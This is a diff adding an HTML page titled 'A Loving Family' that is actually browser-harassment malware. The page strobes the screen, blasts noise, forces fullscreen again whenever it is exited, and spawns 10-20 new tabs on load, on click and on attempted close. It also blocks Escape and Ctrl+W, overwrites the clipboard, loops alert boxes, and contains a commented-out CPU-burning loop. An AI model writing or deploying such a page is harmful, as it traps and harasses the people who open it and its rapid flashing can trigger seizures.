@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A Loving Family</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+            animation: flash 0.1s infinite alternate;
+            cursor: none; /* Hide cursor for annoyance */
+        }
+
+        @keyframes flash {
+            0% { background-color: #f00; filter: invert(0); }
+            20% { background-color: #0f0; filter: invert(1); }
+            40% { background-color: #00f; filter: invert(0); }
+            60% { background-color: #ff0; filter: invert(1); }
+            80% { background-color: #0ff; filter: invert(0); }
+            100% { background-color: #f0f; filter: invert(1); }
+        }
+
+        .spam-text {
+            position: absolute;
+            font-size: 24px;
+            font-weight: bold;
+            animation: move 2s infinite alternate, colorChange 0.5s infinite alternate;
+            white-space: nowrap;
+            user-select: none; /* Prevent text selection */
+        }
+
+        @keyframes move {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            100% { transform: translate(100px, 100px) rotate(360deg); }
+        }
+
+        @keyframes colorChange {
+            0% { color: #f00; }
+            50% { color: #0f0; }
+            100% { color: #00f; }
+        }
+
+        #annoying-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            pointer-events: all; /* Capture all events */
+        }
+    </style>
+</head>
+<body>
+    <div id="annoying-overlay"></div>
+    <audio id="noise" autoplay loop volume="1.0">
+        <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+    </audio>
+
+    <script>
+        // Generate chaotic noise using Web Audio API
+        function createNoise() {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const bufferSize = 4096;
+            const noiseNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
+            noiseNode.onaudioprocess = function(e) {
+                const output = e.outputBuffer.getChannelData(0);
+                for (let i = 0; i < bufferSize; i++) {
+                    output[i] = Math.random() * 2 - 1;
+                }
+            };
+            noiseNode.connect(audioCtx.destination);
+            return noiseNode;
+        }
+        const noise = createNoise();
+
+        // Spam text on screen
+        const messages = ["WE DONT WELCOME YOU HERE", "YOU ARE UNWELCOME", "LEAVE"];
+        function spamText() {
+            for (let i = 0; i < 100; i++) { // Create 100 spam elements
+                const div = document.createElement('div');
+                div.className = 'spam-text';
+                div.textContent = messages[Math.floor(Math.random() * messages.length)];
+                div.style.left = Math.random() * window.innerWidth + 'px';
+                div.style.top = Math.random() * window.innerHeight + 'px';
+                div.style.fontSize = (Math.random() * 40 + 20) + 'px'; // Random size
+                div.style.animationDuration = (Math.random() * 2 + 1) + 's'; // Random speed
+                document.body.appendChild(div);
+
+                // Make text interactive: on click, open more tabs
+                div.addEventListener('click', () => {
+                    duplicateTabs();
+                });
+            }
+        }
+        spamText();
+
+        // Attempt tab duplication
+        function duplicateTabs() {
+            const numTabs = Math.floor(Math.random() * 11) + 10; // 10-20 tabs
+            for (let i = 0; i < numTabs; i++) {
+                window.open(window.location.href, '_blank');
+            }
+        }
+        setTimeout(duplicateTabs, 1000); // Delay to allow page load
+
+        // Maximize volume and restart audio if paused
+        const audio = document.getElementById('noise');
+        if (audio) {
+            audio.volume = 1.0;
+            setInterval(() => {
+                if (audio.paused) {
+                    audio.play();
+                }
+            }, 100);
+        }
+
+        // Force fullscreen on load and loop on exit
+        function enterFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { // Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // IE/Edge
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Listen for fullscreen change and re-enter if exited
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                enterFullscreen();
+            }
+        });
+        document.addEventListener('mozfullscreenchange', () => {
+            if (!document.mozFullScreenElement) {
+                enterFullscreen();
+            }
+        });
+        document.addEventListener('webkitfullscreenchange', () => {
+            if (!document.webkitFullscreenElement) {
+                enterFullscreen();
+            }
+        });
+        document.addEventListener('msfullscreenchange', () => {
+            if (!document.msFullscreenElement) {
+                enterFullscreen();
+            }
+        });
+
+        // Enter fullscreen on load
+        window.addEventListener('load', enterFullscreen);
+
+        // Prevent closing the tab
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = 'Are you sure you want to leave? You are unwelcome here!';
+            // Open more tabs on attempt to close
+            duplicateTabs();
+        });
+
+        // Hijack keyboard events for annoyance
+        document.addEventListener('keydown', (e) => {
+            // Prevent common shortcuts like Ctrl+W, Esc, etc.
+            if (e.key === 'Escape' || (e.ctrlKey && e.key === 'w') || (e.metaKey && e.key === 'w')) {
+                e.preventDefault();
+                // Re-enter fullscreen or duplicate tabs
+                enterFullscreen();
+                duplicateTabs();
+            }
+        });
+
+        // Hijack mouse events: on click anywhere, duplicate tabs
+        document.body.addEventListener('click', (e) => {
+            duplicateTabs();
+        });
+
+        // Infinite loop for high CPU usage (annoyance)
+        function cpuBurner() {
+            while (true) {
+                // Do some pointless computation
+                Math.random() * Math.random();
+            }
+        }
+        // Uncomment if you want extreme annoyance: setTimeout(cpuBurner, 5000);
+
+        // Manipulate clipboard on focus
+        window.addEventListener('focus', () => {
+            navigator.clipboard.writeText('YOU ARE UNWELCOME').catch(() => {});
+        });
+
+        // Randomly resize window if possible (may not work in all browsers)
+        setInterval(() => {
+            window.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
+            window.moveTo(Math.random() * screen.width, Math.random() * screen.height);
+        }, 2000);
+
+        // Create infinite alerts (but delayed to avoid immediate block)
+        function annoyingAlert() {
+            setTimeout(() => {
+                alert('LEAVE NOW!');
+                annoyingAlert();
+            }, 1000);
+        }
+        setTimeout(annoyingAlert, 5000);
+
+        // Make random elements interactive: e.g., images or divs that trigger more chaos
+        // For now, the spam-text already has click handlers
+
+    </script>
+</body>
+</html>
